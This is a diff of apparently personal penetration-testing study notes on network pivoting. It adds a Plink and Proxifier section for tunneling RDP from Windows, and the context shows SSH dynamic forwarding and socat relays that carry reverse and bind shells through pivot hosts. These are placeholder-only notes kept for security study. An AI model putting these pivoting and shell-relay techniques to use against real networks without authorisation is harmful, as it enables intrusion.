@@ -157,6 +157,9 @@ $ ssh -D 9050 user@x.x.x.x
 3. Redirect [[Nmap]]'s packets to run through our proxy chain (*this is called SOCKS tunneling*)
 ![[Proxychains#Redirecting a tool's packets with proxychains]]
 
+### SSH Pivoting with Sshuttle
+
+
 ### Remote/Reverse port forwarding with SSH
 Lets say we are able to connect to a pivot host and then connect to another system. If we wanted to *get a reverse shell* we would have to forward the traffic all the way back through our chain and to our attack machine. We would do this by having the reverse shell point to our nearest pivot host to the target, then from there we would forward all the traffic back through our chain from the pivot host.
 ![[pivot-reverse-shell.drawio.png]]
@@ -275,3 +278,15 @@ $ socat TCP4-LISTEN:<payload_traffic_port>, fork TPC4:<attack_host>:<port>
 $ socat TCP4-LISTEN:<pivot_host_port>, fork TCP4:<target_host>:<port_of_bind_shell>
 ```
 3. Start the bind shell listener on the attack machine that targets the pivot host's IP & port - [[Metasploit]] : `multi/handler`
+
+### Port forwarding from a Windows machine
+[Plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)(*PuTTY link*) is a Windows SSH CLI tool that comes as standard with the PuTTY package. It is sometimes present on windows systems and useful if we are trying to '*live-of-the-land*'. We might be in a situation where we **need to use SSH on a windows system for pivoting** or we could even be using a windows-based attack host, Plink could be the way to do this.
+![[plink.webp]]
+To start the dynamic port forward with plink.exe we can use:
+```batch
+plink -ssh -D <local_port> <user>@<pivot_host>
+```
+
+We can then use [Proxifier](https://www.proxifier.com/) to create a SOCKS tunnel over the SSH session. It allows you to create a SOCKS or HTTPS proxy (and proxy chains) for desktop client applications. [Proxifier](https://www.proxifier.com/) is a GUI application, within it we can create a SOCKS server for `127.0.0.1` on the port we used for SSH.
+
+We can then start `mstsc.exe` with our windows target IP to proxy the RDP connection.
